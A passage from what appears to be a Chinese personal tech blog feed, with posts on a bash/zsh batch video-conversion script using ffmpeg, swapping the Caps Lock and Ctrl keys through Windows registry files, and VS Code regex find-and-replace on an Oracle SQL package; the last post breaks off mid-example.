        <content type="html"><![CDATA[<p>前几天需要转换一下视频格式，结果网上搜了很多工具都只能一个一个的转换，很耗时。<br>但是其中发现了一个可以用命令行来转化视频格式的命令 <a href="https://www.ffmpeg.org/">ffmpeg</a>，所以就想着干脆利用这个命令自己写一个批量转换的脚本好了~<br>正好练习下 <a href="https://ohmyz.sh/">zsh</a> 脚本~</p><span id="more"></span><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>该脚本使用 <a href="https://ohmyz.sh/">zsh</a> 语法，与 <code>bash</code> 语法有区别，后续我会补上 <code>bash</code> 版本的脚本。</li><li>使用该脚本需要先安装 <a href="https://www.ffmpeg.org/">ffmpeg</a> 工具（推荐使用 <a href="https://brew.sh/">homebrew</a> 安装，简单省事~）</li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>思路很简单，就是遍历当前目录下的所有支持转换的视频文件，然后循环执行 <code>ffmpeg</code> 命令。</p><p>废话不多说啦！直接上代码！</p><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># ffmpeg -i input.mp4 output.avi</span><span class="token builtin class-name">echo</span> <span class="token string">"当前正在使用 <span class="token environment constant">$SHELL</span> 执行脚本..."</span><span class="token comment"># 视频路径</span><span class="token assign-left variable">path</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token comment"># 目标类型</span><span class="token assign-left variable">targetType</span><span class="token operator">=</span><span class="token variable">$2</span><span class="token comment"># targetType="mp4"</span><span class="token comment"># 输出目录，为空则与原目录相同</span><span class="token assign-left variable">output</span><span class="token operator">=</span><span class="token variable">$3</span><span class="token comment"># 设置支持的格式（空格隔开）</span><span class="token assign-left variable">suportType</span><span class="token operator">=</span><span class="token punctuation">(</span>webm mp4 avi<span class="token punctuation">)</span><span class="token comment">#该目录下的所有文件</span><span class="token assign-left variable">files</span><span class="token operator">=</span><span class="token variable">$path</span>/*<span class="token comment"># 设置安装的 ffmpeg 路径</span><span class="token assign-left variable">ffmpegPath</span><span class="token operator">=</span>/usr/local/bin<span class="token comment"># 计数</span><span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">0</span><span class="token comment"># 判断输出目录是否为空</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">${targetType}</span> <span class="token punctuation">]</span><span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"目标类型为 mp4"</span><span class="token keyword">else</span>    <span class="token builtin class-name">echo</span> <span class="token string">"目标类型未指定，设置为默认值 mp4"</span>    <span class="token assign-left variable">targetType</span><span class="token operator">=</span><span class="token string">"mp4"</span><span class="token keyword">fi</span><span class="token comment"># 判断输出目录是否为空</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">${output}</span> <span class="token punctuation">]</span><span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"输出目录为 <span class="token variable">$output</span>"</span><span class="token keyword">else</span>    <span class="token builtin class-name">echo</span> <span class="token string">"目标类型未指定，设置为默认值: <span class="token variable">$path</span>/output"</span>    <span class="token assign-left variable">output</span><span class="token operator">=</span><span class="token variable">$path</span>/output<span class="token keyword">fi</span><span class="token comment">#如果文件夹不存在，创建文件夹</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$output</span>"</span> <span class="token punctuation">]</span><span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$output</span><span class="token keyword">fi</span><span class="token builtin class-name">echo</span> <span class="token string">"支持转化以下的视频格式..."</span><span class="token builtin class-name">echo</span> <span class="token variable">$suportType</span><span class="token builtin class-name">echo</span> <span class="token string">""</span><span class="token builtin class-name">echo</span> <span class="token string">"任务开始"</span><span class="token builtin class-name">echo</span> <span class="token string">"搜索 <span class="token variable">$path</span> 目录下的所有文件..."</span><span class="token keyword">for</span> <span class="token for-or-select variable">file</span> <span class="token keyword">in</span> <span class="token variable">$files</span><span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>test <span class="token parameter variable">-f</span> <span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token keyword">then</span>        <span class="token comment"># 文件全名</span>        <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token variable">${file<span class="token operator">##</span>*<span class="token operator">/</span>}</span>        <span class="token comment"># 文件类型</span>        <span class="token assign-left variable">curType</span><span class="token operator">=</span><span class="token variable">${name<span class="token operator">##</span>*.}</span>        <span class="token comment"># 文件名（不包含扩展名）</span>        <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token variable">${name<span class="token operator">%%</span>.*}</span>        <span class="token builtin class-name">echo</span> <span class="token string">"文件类型为 <span class="token variable">$curType</span>"</span>        <span class="token keyword">for</span> <span class="token for-or-select variable">type</span> <span class="token keyword">in</span> <span class="token variable">$suportType</span>        <span class="token keyword">do</span>            <span class="token comment"># 判断是否是支持的类型，已经是目标类型的文件不转换</span>            <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$type</span>==<span class="token variable">$curType</span> &amp;&amp; <span class="token variable">$type</span>!=<span class="token variable">$targetType</span>"</span>            <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$type</span>"</span><span class="token operator">==</span><span class="token string">"<span class="token variable">$curType</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$type</span>"</span><span class="token operator">!=</span><span class="token string">"<span class="token variable">$targetType</span>"</span> <span class="token punctuation">]</span>            <span class="token keyword">then</span>                <span class="token builtin class-name">echo</span> <span class="token string">"正在转换视频："</span>                <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$file</span> &gt;&gt;&gt;&gt; <span class="token variable">$name</span>.<span class="token variable">$targetType</span>"</span>                <span class="token comment"># 执行视频转换命令</span>                <span class="token builtin class-name">echo</span> <span class="token string">"执行命令 <span class="token variable">$ffmpegPath</span>/ffmpeg -i <span class="token variable">$file</span> <span class="token variable">$output</span>/<span class="token variable">$name</span>.<span class="token variable">$targetType</span> -threads 1"</span>                <span class="token variable">$ffmpegPath</span>/ffmpeg <span class="token parameter variable">-i</span> <span class="token variable">$file</span> <span class="token variable">$output</span>/<span class="token variable">$name</span><span class="token builtin class-name">.</span><span class="token variable">$targetType</span> <span class="token parameter variable">-threads</span> <span class="token number">1</span>                <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>count<span class="token operator">+</span><span class="token number">1</span><span class="token variable">))</span></span>                <span class="token builtin class-name">break</span>            <span class="token keyword">fi</span>        <span class="token keyword">done</span>    <span class="token keyword">fi</span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"转换完成，共转换 <span class="token variable">$count</span> 个视频文件"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/zsh</span><span class="token comment"># ffmpeg -i input.mp4 output.avi</span>zmodload zsh/regex<span class="token builtin class-name">echo</span> <span class="token string">"当前正在使用 <span class="token environment constant">$SHELL</span> 执行脚本..."</span><span class="token comment"># 视频路径</span><span class="token assign-left variable">path</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token comment"># path="/Users/baojunjie/Pictures/video"</span><span class="token comment"># 目标类型</span><span class="token assign-left variable">targetType</span><span class="token operator">=</span><span class="token variable">$2</span><span class="token comment"># targetType="mp4"</span><span class="token assign-left variable">output</span><span class="token operator">=</span><span class="token variable">$3</span><span class="token comment"># 设置支持的格式（空格隔开）</span><span class="token assign-left variable">suportType</span><span class="token operator">=</span><span class="token punctuation">(</span>webm mp4 avi<span class="token punctuation">)</span><span class="token comment"># 设置安装的 ffmpeg 路径</span><span class="token assign-left variable">ffmpegPath</span><span class="token operator">=</span>/usr/local/bin<span class="token comment"># 日志文件</span><span class="token assign-left variable">log</span><span class="token operator">=</span><span class="token variable">$path</span>/log.log<span class="token comment"># 计数</span><span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">0</span><span class="token comment"># 判断目标类型是否为空</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">${targetType}</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token string">"目标类型为 mp4"</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token string">"目标类型未指定，设置为默认值 mp4"</span>    <span class="token assign-left variable">targetType</span><span class="token operator">=</span><span class="token string">"mp4"</span><span class="token punctuation">}</span><span class="token comment"># 判断输出目录是否为空</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">${output}</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token string">"输出目录为 <span class="token variable">$output</span>"</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token string">"output 为默认值"</span>    <span class="token assign-left variable">output</span><span class="token operator">=</span><span class="token variable">$path</span>/output<span class="token punctuation">}</span><span class="token builtin class-name">echo</span> <span class="token string">"输出目录为 <span class="token variable">$output</span>"</span><span class="token comment"># 判断目录是否存在，不存在则创建目录</span><span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$output</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>    /bin/mkdir <span class="token variable">$output</span><span class="token punctuation">}</span><span class="token comment"># 初始化正则表达式</span><span class="token assign-left variable">reg</span><span class="token operator">=</span><span class="token string">"^(.*\.("</span><span class="token keyword">for</span> <span class="token builtin class-name">type</span> <span class="token punctuation">(</span><span class="token variable">$suportType</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$type</span> <span class="token operator">!=</span> <span class="token variable">$targetType</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>        <span class="token assign-left variable">reg</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$reg</span>(<span class="token variable">$type</span>)|"</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token builtin class-name">echo</span> <span class="token string">"已经是 <span class="token variable">$type</span> 格式的视频不再转换"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token assign-left variable">reg</span><span class="token operator">=</span><span class="token variable">$reg</span><span class="token punctuation">[</span><span class="token number">1</span>,-2<span class="token punctuation">]</span><span class="token assign-left variable">reg</span><span class="token operator">=</span><span class="token variable">$reg</span><span class="token string">"))$"</span><span class="token comment"># echo "正则表达式：$reg"</span><span class="token builtin class-name">echo</span> <span class="token string">"支持转化以下的视频格式..."</span><span class="token builtin class-name">echo</span> <span class="token variable">$suportType</span><span class="token builtin class-name">echo</span> <span class="token string">""</span><span class="token builtin class-name">echo</span> <span class="token string">"任务开始"</span><span class="token builtin class-name">echo</span> <span class="token string">"搜索 <span class="token variable">$path</span> 目录下的所有文件..."</span><span class="token builtin class-name">cd</span> <span class="token variable">$path</span><span class="token keyword">for</span> <span class="token function">file</span> <span class="token punctuation">(</span>*.*<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token builtin class-name">echo</span> <span class="token string">"当前文件：<span class="token variable">$file</span>"</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>test <span class="token parameter variable">-f</span> <span class="token variable">$file</span><span class="token punctuation">)</span>         <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token variable">${file<span class="token operator">%%</span>.*}</span>        <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$file</span> -regex-match <span class="token variable">$reg</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>            <span class="token builtin class-name">echo</span> <span class="token string">"正在转换视频："</span>            <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$file</span> &gt;&gt;&gt;&gt; <span class="token variable">$name</span>.<span class="token variable">$targetType</span>"</span>            <span class="token comment"># 执行视频转换命令</span>            <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$ffmpegPath</span>/ffmpeg -i <span class="token variable">$file</span> <span class="token variable">$output</span>/<span class="token variable">$name</span>.<span class="token variable">$targetType</span> -threads 1"</span>            <span class="token keyword">if</span> <span class="token punctuation">{</span><span class="token variable">$ffmpegPath</span>/ffmpeg <span class="token parameter variable">-i</span> <span class="token variable">$file</span> <span class="token variable">$output</span>/<span class="token variable">$name</span><span class="token builtin class-name">.</span><span class="token variable">$targetType</span> <span class="token parameter variable">-threads</span> <span class="token number">1</span><span class="token punctuation">}</span> <span class="token punctuation">{</span>                <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>count<span class="token operator">+</span><span class="token number">1</span><span class="token variable">))</span></span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$file</span> 转换失败"</span> <span class="token operator">&gt;&gt;</span> <span class="token variable">$log</span>            <span class="token punctuation">}</span>            <span class="token builtin class-name">echo</span> <span class="token string">""</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token builtin class-name">echo</span> <span class="token string">"格式不支持：<span class="token variable">$file</span>"</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token builtin class-name">echo</span> <span class="token string">"转换完成，共转换 <span class="token variable">$count</span> 个视频文件"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p>终端中输入下面的命令即可执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># bash</span>sh ffmpegs.sh 目录 <span class="token punctuation">[</span>类型<span class="token punctuation">]</span> <span class="token punctuation">[</span>输出目录<span class="token punctuation">]</span><span class="token comment"># zsh</span><span class="token function">zsh</span> ffmpegs.zsh 目录 <span class="token punctuation">[</span>类型<span class="token punctuation">]</span> <span class="token punctuation">[</span>输出目录<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://wx3.sinaimg.cn/large/a6e9cb00ly1fo7vx1d0dog20n30h94qp.gif" alt="效果演示"></p><h2 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h2><p>批量转换视频时 CPU 的使用率很高，尽量减少任务量。</p><p>目前已设置 <code>-threads 1</code> 参数进行单线程操作，但是看起来是每个核一个线程，在 <code>ffmpeg</code> 中并没有找到限制核心使用数量的参数，希望有知道怎么解决这一问题的大神能够告知，谢谢！</p><blockquote><p>感觉不错的话帮我点个赞哟，谢谢~</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> zsh </tag>
            
            <tag> video </tag>
            
            <tag> tool </tag>
            
            <tag> bash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Caps 键与 Ctrl 键互换</title>
      <link href="/2018/01/01/capsctrlswap/"/>
      <url>/2018/01/01/capsctrlswap/</url>
      
        <content type="html"><![CDATA[<h2 id="2018-年的第一篇文章"><a href="#2018-年的第一篇文章" class="headerlink" title="2018 年的第一篇文章"></a>2018 年的第一篇文章</h2><p>如果你经常用到 Ctrl 键，便会为他的位置打抱不平，而 Capslock 键则有种占着茅坑不那啥的感觉，特别是其功能几乎完全可以被 Shift 键所代替。</p><p>再加上我用了 HHKB 键盘之后，感觉 HHKB 的键位布局很舒服，之后再用普通键盘就很难受，于是，交换这两个键的位置便是明智之举。</p><p>查找了各种方法之后，感觉修改注册表是最完美的方法。</p><span id="more"></span><h2 id="Caps-与-Ctrl-互换"><a href="#Caps-与-Ctrl-互换" class="headerlink" title="Caps 与 Ctrl 互换"></a>Caps 与 Ctrl 互换</h2><blockquote><p>将下面的文本保存为 <code>.reg</code> 格式的文件，然后双击后重启即可</p></blockquote><pre class="line-numbers language-json" data-language="json"><code class="language-json">Windows Registry Editor Version <span class="token number">5.00</span><span class="token punctuation">[</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout<span class="token punctuation">]</span><span class="token string">"Scancode Map"</span>=hex<span class="token operator">:</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">03</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span>1D<span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span>3A<span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span>3A<span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span>1D<span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>## 只将 Caps 改为 Ctrl<blockquote><p>如果你像我一样完全不再使用 Caps 键的话，可以把两个键都设置为 Ctrl 键</p></blockquote><pre class="line-numbers language-json" data-language="json"><code class="language-json">Windows Registry Editor Version <span class="token number">5.00</span><span class="token punctuation">[</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout<span class="token punctuation">]</span><span class="token string">"Scancode Map"</span>=hex<span class="token operator">:</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">02</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span>1d<span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span>3a<span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>同样将上面的文本保存为 <code>.reg</code> 格式的文件，然后双击后重启即可</p><h2 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h2><p>将修改注册表的操作保存成 <code>.reg</code> 文件很神奇啊，用起来很方便，双击一下就改啦！</p><p>所以就顺便了解了下 <code>.reg</code> 注册表文件的格式。</p><p><strong>往注册表中添加键值</strong>就如上面一样，不说啦，下面补充下如何删除注册表。</p><h3 id="删除整个子项"><a href="#删除整个子项" class="headerlink" title="删除整个子项"></a>删除整个子项</h3><p>直接在这项路径前加一个连字符 <code>-</code> 即可。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">Windows Registry Editor Version <span class="token number">5.00</span><span class="token punctuation">[</span>-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>就像上面这样，就会把 Keyboard Layout 这个子项及其下的所有内容删除。<font color="#FF6699">这里只是举个例子！别把这个删了！</font></p><h3 id="删除子项中的某一键值"><a href="#删除子项中的某一键值" class="headerlink" title="删除子项中的某一键值"></a>删除子项中的某一键值</h3><p>直接用上面的例子来讲，删除子项 <code>Keyboard Layout</code> 下的一个 <code>Scancode Map</code> 键值就像这样：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout<span class="token punctuation">]</span><span class="token string">"Scancode Map"</span>=-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>把这个文件也保存成 <code>.reg</code> 的话，加上面的两个 <code>reg</code> 文件，就可以三种模式随意切换啦！<br>喜欢哪个，双击哪个~</p></blockquote><h2 id="macOS-中-Caps-键与-Ctrl-键互换"><a href="#macOS-中-Caps-键与-Ctrl-键互换" class="headerlink" title="macOS 中 Caps 键与 Ctrl 键互换"></a>macOS 中 Caps 键与 Ctrl 键互换</h2><p>macOS 中互换 Caps 键和 Ctrl 键很方便，直接在 <code>系统偏好设置&gt;键盘&gt;修饰键...</code> 中改一下就好啦！</p><p><img src="http://wx4.sinaimg.cn/mw690/a6e9cb00gy1fn2kw2233gj20n60f6gox.jpg" alt="CapsCtrlSwap"></p>]]></content>
      
      
      <categories>
          
          <category> 触类旁通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Keyboard </tag>
            
            <tag> Ctrl </tag>
            
            <tag> Caps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VS Code 正则表达式查找替换</title>
      <link href="/2017/12/18/regexreplace/"/>
      <url>/2017/12/18/regexreplace/</url>
      
        <content type="html"><![CDATA[<p>最近做的事情经常要处理重复的文本，用了一段时间之后，利用正则表达式来查找字符串基本上是很熟练啦~<br>但是前几天看到 <a href="https://t.me/drakeets/233">drakeet</a> 大神使用正则表达式把自己项目中所有下划线命名的变量改为驼峰命名法之后我知道，原来正则表达式还可以这么玩！<br>哇塞，之前完全就没想过诶，果然是只有想不到，没有做不到啊。。。<br>所以马上学习了如何使用正则表达式高效的查找替换，哈哈哈，效率提升不是一星半点啊！</p><blockquote><p><a href="/2017/03/15/RegexGrammar/">正则表达式基础</a>就不再赘述了</p></blockquote><span id="more"></span><h2 id="查找替换"><a href="#查找替换" class="headerlink" title="查找替换"></a>查找替换</h2><p>先上例子：<br>我要写个存储过程，直接把表结构粘贴过来作为 RECORD（如下），一行一行改就太麻烦了，用正则表达式之后瞬间完成啊！</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> PACKAGE PCKG_ASYNC_AIMP440020_EXPORT <span class="token operator">IS</span>  <span class="token keyword">TYPE</span> R_AIMP440020_LIST_REC <span class="token operator">IS</span> RECORD<span class="token punctuation">(</span>  TASK_ID    VARCHAR2<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  BATCH_DATE VARCHAR2<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  DATA_DATE  VARCHAR2<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  DATA_REF VARCHAR2<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  DATA_SOURCE      VARCHAR2<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  PI_INDICATOR VARCHAR2<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  PRODUCT_TYPE      VARCHAR2<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  REFERENCE_NUMBER VARCHAR2<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  CI_NUMBER             VARCHAR2<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  CI_GL_DESC VARCHAR2<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  ISSUER_TYPE      VARCHAR2<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  ISSUER_COUNTRY VARCHAR2<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  FITCH_RATING VARCHAR2<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  MOODY_RATING VARCHAR2<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  SP_RATING VARCHAR2<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  TRADE_DATE VARCHAR2<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  VALUE_DATE VARCHAR2<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  MAT_DATE VARCHAR2<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  MAT_TENOR VARCHAR2<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  CACLULATION_RATIO VARCHAR2<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  CCY VARCHAR2<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  CUR_AMOUNT           NUMBER<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  CUR_AMOUNT_LCE       NUMBER<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  LAST_AMOUNT           NUMBER<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  LAST_AMOUNT_LCE       NUMBER<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  VARI_AMOUNT           NUMBER<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  VARI_AMOUNT_LCE       NUMBER<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  VARI_LCE VARCHAR2<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改成这个样子:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> PACKAGE PCKG_ASYNC_AIMP440020_EXPORT <span class="token operator">IS</span>  <span class="token keyword">TYPE</span> R_AIMP440020_LIST_REC <span class="token operator">IS</span> RECORD<span class="token punctuation">(</span>  TASK_ID AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>TASK_ID<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token keyword">type</span><span class="token punctuation">,</span>  BATCH_DATE AIMP440020_CFR_M_BREK<span class="token punctuation">.</span>BATCH_DATE<span class="token variable">@HKBRIISP_COSP_ADP_HKBRIISP</span><span class="token operator">%</span><span class="token 